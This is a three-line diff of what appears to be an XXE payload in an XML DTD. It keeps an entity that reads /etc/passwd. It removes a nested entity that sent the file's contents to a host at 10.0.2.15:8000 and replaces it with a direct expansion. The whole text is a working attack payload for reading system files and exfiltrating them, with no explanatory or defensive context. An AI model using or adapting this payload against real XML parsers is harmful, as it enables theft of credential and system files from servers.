@@ -1,3 +1,2 @@
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://10.0.2.15:8000/?%p1;'>">
-%p2;
+%p1;
